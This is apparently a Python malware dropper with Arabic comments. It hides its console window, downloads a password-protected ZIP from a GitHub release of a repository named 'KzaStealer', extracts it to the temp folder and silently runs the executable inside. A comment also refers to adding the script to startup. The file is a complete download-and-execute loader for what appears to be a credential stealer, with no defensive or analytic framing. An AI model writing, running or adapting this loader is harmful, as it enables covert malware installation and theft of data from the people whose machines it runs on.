import os
import shutil
import sys
import requests
import tempfile
import pyzipper
import subprocess
import ctypes
from pathlib import Path

# دالة لإخفاء نافذة الكونسول
def hide_console_window():
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# تحميل ملف ZIP من GitHub
def download_zip(url):
    try:
        response = requests.get(url)
        if response.status_code == 200:
            zip_path = os.path.join(tempfile.gettempdir(), 'downloaded_file.zip')
            with open(zip_path, 'wb') as file:
                file.write(response.content)
            print(f"File downloaded to: {zip_path}")
            return zip_path
        else:
            print(f"Failed to download the file. Status code: {response.status_code}")
            return None
    except Exception as e:
        print(f"Error downloading the file: {e}")
        return None

# فك تشفير ملف ZIP واستخراج محتويات الملف المشفر
def extract_files(zip_path, password):
    try:
        with pyzipper.AESZipFile(zip_path, 'r') as zip_ref:
            zip_ref.pwd = password.encode('utf-8')
            # استخراج جميع الملفات في المجلد المؤقت
            temp_dir = tempfile.gettempdir()
            zip_ref.extractall(temp_dir)
            print(f"Files extracted to: {temp_dir}")
            return temp_dir
    except Exception as e:
        print(f"Error extracting ZIP file: {e}")
        return None

# تشغيل ملف disable-6.22.2.exe من المجلد المستخرج
def run_disable_6_22_2(file_path):
    try:
        # التأكد من أن الملف disable-6.22.2.exe موجود
        if os.path.exists(file_path):
            print(f"Running disable-6.22.2: {file_path}")
            # تشغيل البرنامج باستخدام Popen في الخلفية
            subprocess.Popen(file_path, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            print(f"Successfully started: {file_path}")
        else:
            print(f"Error: disable-6.22.2.exe not found at {file_path}")
    except Exception as e:
        print(f"Error running disable-6.22.2.exe: {e}")

def main():
    hide_console_window()  # إخفاء نافذة الكونسول

    # إضافة السكربت إلى مجلد بدء التشغيل

    # عنوان URL للملف ZIP المشفر على GitHub
    url = 'https://github.com/COKZA/KzaStealer/releases/download/cok/disable.zip'
    password = 'disable'

    # تحميل الملف ZIP
    zip_path = download_zip(url)
    if zip_path:
        # استخراج الملفات من الأرشيف
        extracted_folder = extract_files(zip_path, password)
        if extracted_folder:
            # تحديد المسار الكامل لملف disable-6.22.2.exe داخل المجلد المستخرج
            disable_6_22_2_path = os.path.join(extracted_folder, 'disable', 'disable.exe')
            # تشغيل disable-6.22.2.exe
            run_disable_6_22_2(disable_6_22_2_path)

if __name__ == "__main__":
    main()
